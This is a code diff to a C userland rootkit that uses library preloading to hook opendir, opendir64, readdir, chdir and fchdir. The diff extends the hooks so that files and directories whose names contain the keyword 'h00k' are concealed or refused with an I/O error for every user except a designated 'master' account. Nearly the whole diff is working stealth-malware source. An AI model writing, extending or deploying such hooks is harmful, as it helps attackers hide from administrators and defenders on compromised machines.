@@ -18,6 +18,16 @@
 #define keyword "h00k"
 #define permission "root"
 
+
+//directory stuff
+DIR *(*old_opendir)(const char *name);
+DIR *(*old_opendir64)(const char *name);
+struct dirent *(*old_readdir)(DIR *dirp);
+int *(*old_chdir)(const char *path);
+int *(*old_fchdir)(int fd);
+
+
+
 int ismaster(){
     //TODO find a good way to verify that master is master
    struct passwd *user = getpwuid(getuid());
@@ -30,10 +40,6 @@ int ismaster(){
 
 }
 
-//delcare the old functions :)
-DIR *(*old_opendir)(const char *name);
-struct dirent *(*old_readdir)(DIR *dirp);
-
 //hook the opendir function
 DIR *opendir(const char *name){
     
@@ -41,13 +47,30 @@ DIR *opendir(const char *name){
 	old_opendir = dlsym(RTLD_NEXT,"opendir");
     }
 
-    //hide file here
-    if(strstr(name,keyword)){
-	fprintf(stderr,"Permission Denied\n");
-	return 0;
+    if(ismaster() != 0){
+	if(strstr(name,keyword)){
+	    errno = EIO;
+	    return NULL;
+	}
     }
 
     return old_opendir(name);
+}
+
+DIR *opendir64(const char *name){
+    if(!old_opendir64){
+	old_opendir64 = dlsym(RTLD_NEXT,"opendir64");
+    }
+   
+    if(ismaster() != 0){
+	if(strstr(name,keyword)){
+	    errno = EIO;
+	    return NULL;
+	}
+    }
+
+    return old_opendir64(name);
+
 }
 
 struct dirent *readdir(DIR *dirp){
@@ -71,6 +94,33 @@ struct dirent *readdir(DIR *dirp){
 
     //printf("hit\n");
     return dir;
+
+}
+
+int chdir(const char *path){
+    
+    if(!old_chdir){
+	old_chdir = dlsym(RTLD_NEXT,"chdir");
+    }
+
+    if(ismaster() != 0){
+	if(strstr(path,keyword)){
+	    errno = EIO;
+	    return -1;
+	}
+    }
+
+    return old_chdir(path);
+
+}
+
+int fchdir(int fd){
+    
+    if(!old_fchdir){
+	old_fchdir = dlsym(RTLD_NEXT,"fchdir");
+    }
+
+    return old_fchdir(fd);
 
 }
 
